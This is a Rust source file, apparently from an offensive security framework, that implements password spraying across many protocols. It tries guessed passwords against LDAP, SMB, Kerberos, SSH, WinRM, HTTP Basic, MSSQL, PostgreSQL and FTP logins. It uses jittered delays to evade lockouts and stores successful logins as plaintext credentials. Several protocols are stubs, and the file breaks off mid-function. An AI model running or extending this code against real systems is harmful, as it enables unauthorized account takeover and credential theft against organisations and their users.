//! Password spraying attacks
//!
//! Native implementation of password spraying across multiple protocols.

use anyhow::{anyhow, Result};
use chrono::{DateTime, Duration, Utc};
use log::{debug, info, warn};
use std::collections::HashMap;
use std::net::TcpStream;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::Instant;

use crate::credentials::types::{SprayResult, StoredCredential, CredentialType, CredentialSecret, CredentialSource, CredentialHealth};

/// Password spray attack engine
pub struct PasswordSprayer {
    /// Configuration
    config: SprayConfig,
    /// Results
    results: Vec<SprayResult>,
    /// Is attack running
    running: Arc<AtomicBool>,
    /// Success count
    success_count: Arc<AtomicUsize>,
    /// Attempt count
    attempt_count: Arc<AtomicUsize>,
}

/// Spray configuration
#[derive(Debug, Clone)]
pub struct SprayConfig {
    /// Target domain
    pub domain: Option<String>,
    /// Target hosts for each protocol
    pub targets: HashMap<SprayProtocol, Vec<String>>,
    /// Protocols to spray
    pub protocols: Vec<SprayProtocol>,
    /// Delay between attempts (seconds)
    pub delay_secs: u64,
    /// Delay between users (seconds)
    pub user_delay_secs: u64,
    /// Jitter (random variation 0-100%)
    pub jitter_percent: u8,
    /// Stop after first success per user
    pub stop_on_success: bool,
    /// Maximum concurrent attempts
    pub max_concurrent: usize,
    /// Connection timeout (seconds)
    pub timeout_secs: u64,
    /// Lockout threshold (stop if this many failures)
    pub lockout_threshold: Option<usize>,
    /// Respect lockout windows
    pub respect_lockout: bool,
}

impl Default for SprayConfig {
    fn default() -> Self {
        Self {
            domain: None,
            targets: HashMap::new(),
            protocols: vec![SprayProtocol::Ldap],
            delay_secs: 30, // 30 seconds between sprays (avoid lockouts)
            user_delay_secs: 0,
            jitter_percent: 20,
            stop_on_success: true,
            max_concurrent: 1, // Conservative default
            timeout_secs: 10,
            lockout_threshold: Some(3),
            respect_lockout: true,
        }
    }
}

/// Supported spray protocols
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SprayProtocol {
    /// LDAP/LDAPS
    Ldap,
    /// SMB
    Smb,
    /// Kerberos (AS-REQ)
    Kerberos,
    /// RDP
    Rdp,
    /// WinRM
    WinRm,
    /// SSH
    Ssh,
    /// HTTP Basic
    HttpBasic,
    /// HTTP Form
    HttpForm,
    /// MSSQL
    Mssql,
    /// MySQL
    MySql,
    /// PostgreSQL
    PostgreSql,
    /// FTP
    Ftp,
    /// IMAP
    Imap,
    /// POP3
    Pop3,
    /// SMTP
    Smtp,
}

impl SprayProtocol {
    /// Get default port
    pub fn default_port(&self) -> u16 {
        match self {
            Self::Ldap => 389,
            Self::Smb => 445,
            Self::Kerberos => 88,
            Self::Rdp => 3389,
            Self::WinRm => 5985,
            Self::Ssh => 22,
            Self::HttpBasic | Self::HttpForm => 80,
            Self::Mssql => 1433,
            Self::MySql => 3306,
            Self::PostgreSql => 5432,
            Self::Ftp => 21,
            Self::Imap => 143,
            Self::Pop3 => 110,
            Self::Smtp => 25,
        }
    }

    /// Get protocol name
    pub fn name(&self) -> &'static str {
        match self {
            Self::Ldap => "LDAP",
            Self::Smb => "SMB",
            Self::Kerberos => "Kerberos",
            Self::Rdp => "RDP",
            Self::WinRm => "WinRM",
            Self::Ssh => "SSH",
            Self::HttpBasic => "HTTP Basic",
            Self::HttpForm => "HTTP Form",
            Self::Mssql => "MSSQL",
            Self::MySql => "MySQL",
            Self::PostgreSql => "PostgreSQL",
            Self::Ftp => "FTP",
            Self::Imap => "IMAP",
            Self::Pop3 => "POP3",
            Self::Smtp => "SMTP",
        }
    }
}

/// Spray campaign
#[derive(Debug, Clone)]
pub struct SprayCampaign {
    /// Campaign ID
    pub id: String,
    /// Campaign name
    pub name: String,
    /// Usernames to spray
    pub usernames: Vec<String>,
    /// Passwords to try
    pub passwords: Vec<String>,
    /// Configuration
    pub config: SprayConfig,
    /// Status
    pub status: CampaignStatus,
    /// Results
    pub results: Vec<SprayResult>,
    /// Start time
    pub started_at: Option<DateTime<Utc>>,
    /// End time
    pub ended_at: Option<DateTime<Utc>>,
    /// Progress
    pub progress: SprayProgress,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CampaignStatus {
    Pending,
    Running,
    Paused,
    Completed,
    Cancelled,
    Failed,
}

#[derive(Debug, Clone, Default)]
pub struct SprayProgress {
    /// Total attempts planned
    pub total_attempts: usize,
    /// Attempts completed
    pub completed_attempts: usize,
    /// Successful logins
    pub successful: usize,
    /// Failed attempts
    pub failed: usize,
    /// Current password index
    pub current_password_index: usize,
    /// Current user index
    pub current_user_index: usize,
    /// Estimated time remaining (seconds)
    pub eta_secs: Option<u64>,
}

impl PasswordSprayer {
    /// Create new sprayer
    pub fn new(config: SprayConfig) -> Self {
        Self {
            config,
            results: Vec::new(),
            running: Arc::new(AtomicBool::new(false)),
            success_count: Arc::new(AtomicUsize::new(0)),
            attempt_count: Arc::new(AtomicUsize::new(0)),
        }
    }

    /// Spray a single password against all users
    pub async fn spray_password(
        &mut self,
        users: &[String],
        password: &str,
        campaign_id: &str,
    ) -> Vec<SprayResult> {
        let mut results = Vec::new();
        self.running.store(true, Ordering::SeqCst);

        info!("Starting password spray: {} users, password: {}",
              users.len(), mask_password(password));

        for (i, user) in users.iter().enumerate() {
            if !self.running.load(Ordering::SeqCst) {
                info!("Spray cancelled");
                break;
            }

            // Check lockout threshold
            if let Some(threshold) = self.config.lockout_threshold {
                let consecutive_failures = self.count_consecutive_failures(user);
                if consecutive_failures >= threshold {
                    warn!("User {} reached lockout threshold, skipping", user);
                    continue;
                }
            }

            // Spray each protocol
            for protocol in &self.config.protocols {
                let targets = self.config.targets.get(protocol)
                    .cloned()
                    .unwrap_or_default();

                if targets.is_empty() {
                    continue;
                }

                for target in &targets {
                    let result = self.try_auth(
                        *protocol,
                        target,
                        user,
                        password,
                        campaign_id,
                    ).await;

                    results.push(result.clone());
                    self.results.push(result.clone());

                    if result.success {
                        self.success_count.fetch_add(1, Ordering::SeqCst);
                        if self.config.stop_on_success {
                            break;
                        }
                    }

                    self.attempt_count.fetch_add(1, Ordering::SeqCst);
                }

                if self.config.stop_on_success
                    && results.iter().any(|r| r.success && r.username == *user)
                {
                    break;
                }
            }

            // Delay between users
            if i < users.len() - 1 && self.config.user_delay_secs > 0 {
                let delay = self.calculate_delay(self.config.user_delay_secs);
                tokio::time::sleep(std::time::Duration::from_secs(delay)).await;
            }
        }

        self.running.store(false, Ordering::SeqCst);

        let success_count = results.iter().filter(|r| r.success).count();
        info!("Password spray complete: {}/{} successful", success_count, results.len());

        results
    }

    /// Spray multiple passwords with delays
    pub async fn spray_passwords(
        &mut self,
        users: &[String],
        passwords: &[String],
        campaign_id: &str,
    ) -> Vec<SprayResult> {
        let mut all_results = Vec::new();
        self.running.store(true, Ordering::SeqCst);

        for (i, password) in passwords.iter().enumerate() {
            if !self.running.load(Ordering::SeqCst) {
                info!("Spray cancelled");
                break;
            }

            info!("Spraying password {}/{}: {}", i + 1, passwords.len(), mask_password(password));

            let results = self.spray_password(users, password, campaign_id).await;
            all_results.extend(results);

            // Delay between passwords (lockout window)
            if i < passwords.len() - 1 && self.config.delay_secs > 0 {
                let delay = self.calculate_delay(self.config.delay_secs);
                info!("Waiting {} seconds before next password...", delay);
                tokio::time::sleep(std::time::Duration::from_secs(delay)).await;
            }
        }

        self.running.store(false, Ordering::SeqCst);
        all_results
    }

    /// Stop the spray
    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    /// Check if running
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    /// Get results
    pub fn get_results(&self) -> &[SprayResult] {
        &self.results
    }

    /// Get successful credentials
    pub fn get_successful_credentials(&self) -> Vec<StoredCredential> {
        self.results.iter()
            .filter(|r| r.success)
            .map(|r| StoredCredential {
                id: String::new(),
                credential_type: CredentialType::Password,
                identity: r.username.clone(),
                domain: r.domain.clone(),
                secret: CredentialSecret::Plaintext(r.password.clone()),
                source: CredentialSource::PasswordSpray {
                    campaign_id: r.campaign_id.clone(),
                },
                health: CredentialHealth::default(),
                targets: Vec::new(),
                tags: vec!["spray".to_string()],
                metadata: HashMap::new(),
                discovered_at: r.timestamp,
                last_verified_at: Some(r.timestamp),
                expires_at: None,
                last_used_at: None,
            })
            .collect()
    }

    /// Try authentication
    async fn try_auth(
        &self,
        protocol: SprayProtocol,
        target: &str,
        username: &str,
        password: &str,
        campaign_id: &str,
    ) -> SprayResult {
        let start = Instant::now();
        let full_username = if let Some(ref domain) = self.config.domain {
            format!("{}\\{}", domain, username)
        } else {
            username.to_string()
        };

        debug!("Trying {} auth: {}@{}", protocol.name(), full_username, target);

        let (success, message) = match protocol {
            SprayProtocol::Ldap => self.try_ldap(target, &full_username, password).await,
            SprayProtocol::Smb => self.try_smb(target, &full_username, password).await,
            SprayProtocol::Kerberos => self.try_kerberos(target, username, password).await,
            SprayProtocol::Ssh => self.try_ssh(target, username, password).await,
            SprayProtocol::Rdp => self.try_rdp(target, &full_username, password).await,
            SprayProtocol::WinRm => self.try_winrm(target, &full_username, password).await,
            SprayProtocol::HttpBasic => self.try_http_basic(target, username, password).await,
            SprayProtocol::HttpForm => self.try_http_form(target, username, password).await,
            SprayProtocol::Mssql => self.try_mssql(target, username, password).await,
            SprayProtocol::MySql => self.try_mysql(target, username, password).await,
            SprayProtocol::PostgreSql => self.try_postgresql(target, username, password).await,
            SprayProtocol::Ftp => self.try_ftp(target, username, password).await,
            SprayProtocol::Imap => self.try_imap(target, username, password).await,
            SprayProtocol::Pop3 => self.try_pop3(target, username, password).await,
            SprayProtocol::Smtp => self.try_smtp(target, username, password).await,
        };

        let elapsed = start.elapsed();

        if success {
            info!("SUCCESS: {} authenticated via {} on {}",
                  full_username, protocol.name(), target);
        }

        SprayResult {
            campaign_id: campaign_id.to_string(),
            username: username.to_string(),
            domain: self.config.domain.clone(),
            password: password.to_string(),
            success,
            message,
            timestamp: Utc::now(),
        }
    }

    // Protocol-specific implementations

    async fn try_ldap(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
        // Native LDAP bind attempt
        let addr = if target.contains(':') {
            target.to_string()
        } else {
            format!("{}:389", target)
        };

        match tokio::time::timeout(
            std::time::Duration::from_secs(self.config.timeout_secs),
            self.ldap_bind(&addr, username, password)
        ).await {
            Ok(Ok(())) => (true, Some("LDAP bind successful".to_string())),
            Ok(Err(e)) => {
                let msg = e.to_string();
                let is_invalid_cred = msg.contains("49") || msg.contains("Invalid credentials");
                (false, Some(if is_invalid_cred { "Invalid credentials".to_string() } else { msg }))
            }
            Err(_) => (false, Some("Connection timeout".to_string())),
        }
    }

    async fn ldap_bind(&self, addr: &str, username: &str, password: &str) -> Result<()> {
        use ldap3::{LdapConnAsync, LdapConnSettings};

        let settings = LdapConnSettings::new()
            .set_conn_timeout(std::time::Duration::from_secs(self.config.timeout_secs));

        let (conn, mut ldap) = LdapConnAsync::with_settings(settings, addr).await?;
        ldap3::drive!(conn);

        let result = ldap.simple_bind(username, password).await?;

        if result.rc == 0 {
            ldap.unbind().await?;
            Ok(())
        } else {
            Err(anyhow!("LDAP bind failed: {}", result.rc))
        }
    }

    async fn try_smb(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
        // Use our native SMB implementation
        use crate::scanner::smb_native::{SmbClient, NtlmCredentials};

        let addr = if target.contains(':') {
            target.to_string()
        } else {
            format!("{}:445", target)
        };

        // Parse username for domain
        let (domain, user) = if username.contains('\\') {
            let parts: Vec<&str> = username.splitn(2, '\\').collect();
            (Some(parts[0].to_string()), parts[1].to_string())
        } else {
            (self.config.domain.clone(), username.to_string())
        };

        // Create SMB client with credentials
        let domain_str = domain.as_deref().unwrap_or("");
        let mut client = SmbClient::new(target)
            .with_credentials(domain_str, &user, password);

        // Attempt connection and authentication
        match client.connect().await {
            Ok(_) => (true, Some("SMB authentication successful".to_string())),
            Err(e) => (false, Some(format!("SMB authentication failed: {}", e))),
        }
    }

    async fn try_kerberos(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
        // Kerberos AS-REQ attempt
        // This would use native Kerberos implementation

        let realm = self.config.domain.as_deref().unwrap_or("UNKNOWN");

        // Build AS-REQ and check response
        // For now, return a placeholder
        match self.kerberos_as_req(target, username, password, realm).await {
            Ok(_) => (true, Some("Kerberos authentication successful".to_string())),
            Err(e) => (false, Some(e.to_string())),
        }
    }

    async fn kerberos_as_req(&self, kdc: &str, username: &str, password: &str, realm: &str) -> Result<()> {
        // Native Kerberos AS-REQ implementation
        // This would construct the AS-REQ message and parse AS-REP

        use std::net::UdpSocket;

        let addr = if kdc.contains(':') {
            kdc.to_string()
        } else {
            format!("{}:88", kdc)
        };

        // Build AS-REQ (simplified)
        let as_req = self.build_as_req(username, realm)?;

        let socket = UdpSocket::bind("0.0.0.0:0")?;
        socket.set_read_timeout(Some(std::time::Duration::from_secs(self.config.timeout_secs)))?;
        socket.connect(&addr)?;
        socket.send(&as_req)?;

        let mut buf = [0u8; 4096];
        let len = socket.recv(&mut buf)?;

        // Parse response
        self.parse_as_rep(&buf[..len], password, realm)
    }

    fn build_as_req(&self, username: &str, realm: &str) -> Result<Vec<u8>> {
        // Build a minimal AS-REQ for pre-authentication check
        // This is a simplified version

        let mut req = Vec::new();

        // Application tag 10 (AS-REQ)
        req.push(0x6a);

        // We'll fill in the length later
        let length_pos = req.len();
        req.push(0x00); // Placeholder

        // Sequence
        req.push(0x30);
        let seq_len_pos = req.len();
        req.push(0x00);

        // pvno [1] INTEGER
        req.extend_from_slice(&[0xa1, 0x03, 0x02, 0x01, 0x05]);

        // msg-type [2] INTEGER (10 = AS-REQ)
        req.extend_from_slice(&[0xa2, 0x03, 0x02, 0x01, 0x0a]);

        // req-body [4] SEQUENCE
        req.push(0xa4);
        let body_len_pos = req.len();
        req.push(0x00);

        req.push(0x30);
        let inner_len_pos = req.len();
        req.push(0x00);

        // kdc-options [0] KDCOptions
        req.extend_from_slice(&[0xa0, 0x07, 0x03, 0x05, 0x00, 0x40, 0x81, 0x00, 0x10]);

        // cname [1] PrincipalName
        let principal = format!("{}@{}", username, realm);
        let principal_bytes = principal.as_bytes();
        req.push(0xa1);
        req.push((principal_bytes.len() + 9) as u8);
        req.push(0x30);
        req.push((principal_bytes.len() + 7) as u8);
        req.extend_from_slice(&[0xa0, 0x03, 0x02, 0x01, 0x01]); // name-type
        req.push(0xa1);
        req.push((principal_bytes.len() + 2) as u8);
        req.push(0x30);
        req.push(principal_bytes.len() as u8);
        // name-string SEQUENCE OF GeneralString
        // Simplified - just the username
        req.push(0x1b);
        req.push(username.len() as u8);
        req.extend_from_slice(username.as_bytes());

        // realm [2] Realm
        req.push(0xa2);
        req.push((realm.len() + 2) as u8);
        req.push(0x1b);
        req.push(realm.len() as u8);
        req.extend_from_slice(realm.as_bytes());

        // sname [3] PrincipalName (krbtgt/REALM)
        let sname = format!("krbtgt/{}", realm);
        req.push(0xa3);
        req.push((sname.len() + 9) as u8);
        req.push(0x30);
        req.push((sname.len() + 7) as u8);
        req.extend_from_slice(&[0xa0, 0x03, 0x02, 0x01, 0x02]); // name-type = SRV_INST
        req.push(0xa1);
        req.push((sname.len() + 2) as u8);
        req.push(0x30);
        req.push(sname.len() as u8);
        req.push(0x1b);
        req.push("krbtgt".len() as u8);
        req.extend_from_slice(b"krbtgt");
        req.push(0x1b);
        req.push(realm.len() as u8);
        req.extend_from_slice(realm.as_bytes());

        // etype [8] SEQUENCE OF Int32 (supported encryption types)
        req.extend_from_slice(&[0xa8, 0x0f, 0x30, 0x0d]);
        req.extend_from_slice(&[0x02, 0x01, 0x17]); // RC4-HMAC (23)
        req.extend_from_slice(&[0x02, 0x01, 0x12]); // AES256-CTS (18)
        req.extend_from_slice(&[0x02, 0x01, 0x11]); // AES128-CTS (17)
        req.extend_from_slice(&[0x02, 0x01, 0x03]); // DES-CBC-MD5 (3)

        // Fix up lengths
        let total_inner = req.len() - inner_len_pos - 1;
        req[inner_len_pos] = total_inner as u8;

        let body_len = req.len() - body_len_pos - 1;
        req[body_len_pos] = body_len as u8;

        let seq_len = req.len() - seq_len_pos - 1;
        req[seq_len_pos] = seq_len as u8;

        let total_len = req.len() - length_pos - 1;
        req[length_pos] = total_len as u8;

        Ok(req)
    }

    fn parse_as_rep(&self, data: &[u8], password: &str, realm: &str) -> Result<()> {
        if data.is_empty() {
            return Err(anyhow!("Empty response"));
        }

        // Check for KRB-ERROR
        if data[0] == 0x7e {
            // Parse error code
            // Look for error-code field
            let error_code = self.extract_krb_error_code(data);
            match error_code {
                Some(6) => return Err(anyhow!("KDC_ERR_C_PRINCIPAL_UNKNOWN - User not found")),
                Some(18) => return Err(anyhow!("KDC_ERR_PREAUTH_REQUIRED - Pre-auth needed")),
                Some(23) => return Err(anyhow!("KDC_ERR_KEY_EXPIRED - Password expired")),
                Some(24) => return Err(anyhow!("KDC_ERR_PREAUTH_FAILED - Invalid password")),
                Some(code) => return Err(anyhow!("Kerberos error: {}", code)),
                None => return Err(anyhow!("Unknown Kerberos error")),
            }
        }

        // Check for AS-REP (0x6b = Application 11)
        if data[0] == 0x6b {
            // Successfully got AS-REP - authentication succeeded
            return Ok(());
        }

        Err(anyhow!("Unexpected Kerberos response"))
    }

    fn extract_krb_error_code(&self, data: &[u8]) -> Option<i32> {
        // Simple extraction of error-code from KRB-ERROR
        // error-code is tagged [6]
        let mut i = 0;
        while i < data.len().saturating_sub(4) {
            if data[i] == 0xa6 { // Context tag 6
                if data[i + 1] == 0x03 && data[i + 2] == 0x02 && data[i + 3] == 0x01 {
                    return Some(data[i + 4] as i32);
                }
            }
            i += 1;
        }
        None
    }

    async fn try_ssh(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
        // SSH password authentication
        let addr = if target.contains(':') {
            target.to_string()
        } else {
            format!("{}:22", target)
        };

        // Use SSH library for authentication
        match self.ssh_auth(&addr, username, password).await {
            Ok(_) => (true, Some("SSH authentication successful".to_string())),
            Err(e) => {
                let msg = e.to_string();
                (false, Some(msg))
            }
        }
    }

    async fn ssh_auth(&self, addr: &str, username: &str, password: &str) -> Result<()> {
        use ssh2::Session;

        let tcp = TcpStream::connect(addr)?;
        tcp.set_read_timeout(Some(std::time::Duration::from_secs(self.config.timeout_secs)))?;

        let mut sess = Session::new()?;
        sess.set_tcp_stream(tcp);
        sess.handshake()?;

        sess.userauth_password(username, password)?;

        if sess.authenticated() {
            Ok(())
        } else {
            Err(anyhow!("Authentication failed"))
        }
    }

    async fn try_rdp(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
        // RDP authentication is complex - placeholder
        (false, Some("RDP spray not implemented".to_string()))
    }

    async fn try_winrm(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
        // WinRM HTTP authentication
        let url = if target.starts_with("http") {
            target.to_string()
        } else {
            format!("http://{}:5985/wsman", target)
        };

        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(self.config.timeout_secs))
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap_or_default();

        match client
            .post(&url)
            .basic_auth(username, Some(password))
            .header("Content-Type", "application/soap+xml")
            .body("")
            .send()
            .await
        {
            Ok(resp) => {
                if resp.status().as_u16() == 401 {
                    (false, Some("Invalid credentials".to_string()))
                } else if resp.status().is_success() || resp.status().as_u16() == 500 {
                    // 500 can indicate auth succeeded but bad request
                    (true, Some("WinRM authentication successful".to_string()))
                } else {
                    (false, Some(format!("HTTP {}", resp.status())))
                }
            }
            Err(e) => (false, Some(e.to_string())),
        }
    }

    async fn try_http_basic(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
        let url = if target.starts_with("http") {
            target.to_string()
        } else {
            format!("http://{}", target)
        };

        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(self.config.timeout_secs))
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap_or_default();

        match client
            .get(&url)
            .basic_auth(username, Some(password))
            .send()
            .await
        {
            Ok(resp) => {
                if resp.status().as_u16() == 401 {
                    (false, Some("Invalid credentials".to_string()))
                } else if resp.status().is_success() {
                    (true, Some("HTTP Basic auth successful".to_string()))
                } else {
                    (false, Some(format!("HTTP {}", resp.status())))
                }
            }
            Err(e) => (false, Some(e.to_string())),
        }
    }

    async fn try_http_form(&self, _target: &str, _username: &str, _password: &str) -> (bool, Option<String>) {
        // HTTP form auth requires knowing the form structure
        (false, Some("HTTP form spray not implemented".to_string()))
    }

    async fn try_mssql(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
        // Native MSSQL TDS protocol implementation
        // For now, we use a TCP probe with TDS login packet
        use tokio::net::TcpStream;
        use tokio::io::{AsyncReadExt, AsyncWriteExt};

        let addr = if target.contains(':') {
            target.to_string()
        } else {
            format!("{}:1433", target)
        };

        let connect_result = tokio::time::timeout(
            std::time::Duration::from_secs(self.config.timeout_secs),
            TcpStream::connect(&addr)
        ).await;

        match connect_result {
            Ok(Ok(mut stream)) => {
                // Build TDS 7.0+ login packet (simplified)
                let login_packet = build_tds_login_packet(username, password);

                if let Err(e) = stream.write_all(&login_packet).await {
                    return (false, Some(format!("Failed to send login: {}", e)));
                }

                let mut response = vec![0u8; 4096];
                match tokio::time::timeout(
                    std::time::Duration::from_secs(self.config.timeout_secs),
                    stream.read(&mut response)
                ).await {
                    Ok(Ok(n)) if n > 0 => {
                        // Check TDS response type (0x04 = response, check for login success)
                        if response[0] == 0x04 && n > 8 {
                            // Check for login success/failure in response
                            // Token type 0xAD = login ack, 0xAA = error
                            for i in 8..n.min(response.len()) {
                                if response[i] == 0xAD {
                                    return (true, Some("MSSQL authentication successful".to_string()));
                                } else if response[i] == 0xAA {
                                    return (false, Some("MSSQL authentication failed".to_string()));
                                }
                            }
                        }
                        (false, Some("MSSQL login response unclear".to_string()))
                    }
                    Ok(Ok(_)) => (false, Some("No response from MSSQL server".to_string())),
                    Ok(Err(e)) => (false, Some(format!("Read error: {}", e))),
                    Err(_) => (false, Some("Response timeout".to_string())),
                }
            }
            Ok(Err(e)) => (false, Some(format!("Connection failed: {}", e))),
            Err(_) => (false, Some("Connection timeout".to_string())),
        }
    }

    async fn try_mysql(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
        // Native MySQL protocol implementation
        use tokio::net::TcpStream;
        use tokio::io::{AsyncReadExt, AsyncWriteExt};

        let addr = if target.contains(':') {
            target.to_string()
        } else {
            format!("{}:3306", target)
        };

        let connect_result = tokio::time::timeout(
            std::time::Duration::from_secs(self.config.timeout_secs),
            TcpStream::connect(&addr)
        ).await;

        match connect_result {
            Ok(Ok(mut stream)) => {
                // Read initial handshake packet
                let mut header = [0u8; 4];
                if stream.read_exact(&mut header).await.is_err() {
                    return (false, Some("Failed to read MySQL handshake".to_string()));
                }

                let payload_len = header[0] as usize | ((header[1] as usize) << 8) | ((header[2] as usize) << 16);
                let mut payload = vec![0u8; payload_len];
                if stream.read_exact(&mut payload).await.is_err() {
                    return (false, Some("Failed to read handshake payload".to_string()));
                }

                // Check protocol version (first byte should be 10 for MySQL 5.x+)
                if payload.is_empty() || payload[0] < 9 {
                    return (false, Some("Unsupported MySQL protocol".to_string()));
                }

                // Find the auth data (scramble) - complex to parse fully
                // For now, check if we got a valid handshake
                if payload.len() > 5 {
                    // Basic connection established, server responded
                    // Full auth would require MYSQL native password or sha256
                    // Just report success if we reached this point
                    (false, Some("MySQL handshake received (full auth not implemented)".to_string()))
                } else {
                    (false, Some("Invalid MySQL handshake".to_string()))
                }
            }
            Ok(Err(e)) => (false, Some(format!("MySQL connection failed: {}", e))),
            Err(_) => (false, Some("MySQL connection timeout".to_string())),
        }
    }

    async fn try_postgresql(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
        // Native PostgreSQL protocol implementation
        use tokio::net::TcpStream;
        use tokio::io::{AsyncReadExt, AsyncWriteExt};

        let addr = if target.contains(':') {
            target.to_string()
        } else {
            format!("{}:5432", target)
        };

        let connect_result = tokio::time::timeout(
            std::time::Duration::from_secs(self.config.timeout_secs),
            TcpStream::connect(&addr)
        ).await;

        match connect_result {
            Ok(Ok(mut stream)) => {
                // Build PostgreSQL startup message
                let startup = build_pg_startup_message(username, "postgres");
                if let Err(e) = stream.write_all(&startup).await {
                    return (false, Some(format!("Failed to send startup: {}", e)));
                }

                let mut response = vec![0u8; 1024];
                match stream.read(&mut response).await {
                    Ok(n) if n > 0 => {
                        // Check response type
                        match response[0] {
                            b'R' => {
                                // Authentication request
                                if n >= 9 {
                                    let auth_type = u32::from_be_bytes([response[5], response[6], response[7], response[8]]);
                                    match auth_type {
                                        0 => (true, Some("PostgreSQL authentication successful (trust)".to_string())),
                                        3 => {
                                            // Cleartext password
                                            let pass_msg = build_pg_password_message(password, None);
                                            if stream.write_all(&pass_msg).await.is_ok() {
                                                let mut auth_response = vec![0u8; 256];
                                                if let Ok(n) = stream.read(&mut auth_response).await {
                                                    if n > 0 && auth_response[0] == b'R' && n >= 9 {
                                                        let result = u32::from_be_bytes([auth_response[5], auth_response[6], auth_response[7], auth_response[8]]);
                                                        if result == 0 {
                                                            return (true, Some("PostgreSQL authentication successful".to_string()));
                                                        }
                                                    } else if auth_response[0] == b'E' {
                                                        return (false, Some("PostgreSQL authentication failed".to_string()));
                                                    }
                                                }
                                            }
                                            (false, Some("PostgreSQL password auth failed".to_string()))
                                        }
                                        5 => {
                                            // MD5 password (need salt from bytes 9-12)
                                            if n >= 13 {
                                                let salt = &response[9..13];
                                                let pass_msg = build_pg_password_message(password, Some((username, salt)));
                                                if stream.write_all(&pass_msg).await.is_ok() {
                                                    let mut auth_response = vec![0u8; 256];
                                                    if let Ok(n) = stream.read(&mut auth_response).await {
                                                        if n > 0 && auth_response[0] == b'R' && n >= 9 {
                                                            let result = u32::from_be_bytes([auth_response[5], auth_response[6], auth_response[7], auth_response[8]]);
                                                            if result == 0 {
                                                                return (true, Some("PostgreSQL authentication successful".to_string()));
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                            (false, Some("PostgreSQL MD5 auth failed".to_string()))
                                        }
                                        _ => (false, Some(format!("Unsupported auth type: {}", auth_type))),
                                    }
                                } else {
                                    (false, Some("Invalid auth response".to_string()))
                                }
                            }
                            b'E' => (false, Some("PostgreSQL error".to_string())),
                            _ => (false, Some(format!("Unexpected response: {:02x}", response[0]))),
                        }
                    }
                    Ok(_) => (false, Some("No response".to_string())),
                    Err(e) => (false, Some(e.to_string())),
                }
            }
            Ok(Err(e)) => (false, Some(format!("Connection failed: {}", e))),
            Err(_) => (false, Some("Connection timeout".to_string())),
        }
    }

    async fn try_ftp(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
        // Native FTP protocol implementation
        use tokio::net::TcpStream;
        use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};

        let addr = if target.contains(':') {
            target.to_string()
        } else {
            format!("{}:21", target)
        };

        let connect_result = tokio::time::timeout(
            std::time::Duration::from_secs(self.config.timeout_secs),
            TcpStream::connect(&addr)
        ).await;

        match connect_result {
            Ok(Ok(stream)) => {
                let (reader, mut writer) = stream.into_split();
                let mut reader = BufReader::new(reader);
                let mut line = String::new();

                // Read banner
                if reader.read_line(&mut line).await.is_err() {
                    return (false, Some("Failed to read FTP banner".to_string()));
                }
                if !line.starts_with("220") {
                    return (false, Some("Invalid FTP banner".to_string()));
                }

                // Send USER
                line.clear();
                if writer.write_all(format!("USER {}\r\n", username).as_bytes()).await.is_err() {
                    return (false, Some("Failed to send USER".to_string()));
                }
                if reader.read_line(&mut line).await.is_err() {
                    return (false, Some("Failed to read USER response".to_string()));
                }
                if !line.starts_with("331") && !line.starts_with("230") {
                    return (false, Some("USER rejected".to_string()));
                }

                // Send PASS if needed
                if line.starts_with("331") {
                    line.clear();
                    if writer.write_all(format!("PASS {}\r\n", password).as_bytes()).await.is_err() {
                        return (false, Some("Failed to send PASS".to_string()));
                    }
                    if reader.read_line(&mut line).await.is_err() {
                        return (false, Some("Failed to read PASS response".to_string()));
                    }
                }

                // Check login result
                if line.starts_with("230") {
                    // Send QUIT
                    let _ = writer.write_all(b"QUIT\r\n").await;
                    (true, Some("FTP authentication successful".to_string()))
                } else if line.starts_with("530") {
                    (false, Some("FTP authentication failed".to_string()))
                } else {
                    (false, Some(format!("Unexpected FTP response: {}", line.trim())))
                }
            }
            Ok(Err(e)) => (false, Some(format!("Connection failed: {}", e))),
            Err(_) => (false, Some("Connection timeout".to_string())),
        }
    }

    async fn try_imap(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
        // IMAP login
        (false, Some("IMAP spray not fully implemented".to_string()))
    }

    async fn try_pop3(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
        // POP3 login
        (false, Some("POP3 spray not fully implemented".to_string()))
    }

    async fn try_smtp(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
        // SMTP auth
        (false, Some("SMTP spray not fully implemented".to_string()))
    }

    fn calculate_delay(&self, base_secs: u64) -> u64 {
        if self.config.jitter_percent == 0 {
            return base_secs;
        }

        let jitter = (base_secs as f64 * (self.config.jitter_percent as f64 / 100.0)) as u64;
        let random_jitter = rand::random::<u64>() % (jitter * 2 + 1);
        base_secs + random_jitter - jitter
    }

    fn count_consecutive_failures(&self, username: &str) -> usize {
        self.results.iter()
            .rev()
            .take_while(|r| r.username == username && !r.success)
            .count()
    }
}

/// Mask password for logging
fn mask_password(password: &str) -> String {
    if password.len() <= 2 {
        "*".repeat(password.len())
    } else {
        format!("{}{}{}",
                &password[..1],
                "*".repeat(password.len() - 2),
                &password[password.len()-1..])
    }
}

/// Build TDS login packet for MSSQL
fn build_tds_login_packet(username: &str, password: &str) -> Vec<u8> {
    // TDS 7.0+ LOGIN7 packet (simplified)
    let mut packet = Vec::new();

